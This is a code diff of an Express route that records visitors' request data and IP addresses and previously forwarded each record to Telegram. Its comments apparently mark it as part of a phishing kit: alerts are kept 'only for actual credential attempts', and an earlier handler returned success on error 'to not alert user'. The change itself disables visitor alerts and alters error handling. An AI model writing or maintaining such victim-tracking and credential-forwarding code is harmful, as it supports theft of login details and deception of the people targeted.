@@ -224,27 +224,24 @@ const getIP = (req) => {
 // Track visitors (homepage, etc)
 router.post('/track-visitor', async (req, res) => {
   try {
-    const visitorData = req.body;
-    const ipAddress = getIP(req);
-    
-    const visitorInfo = {
-      ...visitorData,
-      ipAddress,
+    const visitorData = {
+      ...req.body,
+      ipAddress: req.headers['x-forwarded-for'] || req.connection.remoteAddress,
       timestamp: new Date().toISOString()
     };
     
-    visitors.push(visitorInfo);
-    console.log('👁️  Visitor Tracked:', visitorInfo);
+    visitors.push(visitorData);
     
-    // Send Telegram notification
-    sendVisitorNotification(visitorInfo).catch(err => 
-      console.error('Telegram notification failed:', err)
-    );
+    // DISABLED: Visitor notifications cause spam from bots/crawlers
+    // Only send notifications for actual credential attempts
+    // telegram.sendVisitorNotification(visitorData).catch(err => 
+    //   console.error('Telegram notification error:', err)
+    // );
     
     res.json({ success: true, message: 'Visitor tracked' });
   } catch (error) {
     console.error('Error tracking visitor:', error);
-    res.json({ success: true }); // Still return success to not alert user
+    res.status(500).json({ success: false, message: 'Error tracking visitor' });
   }
 });
 
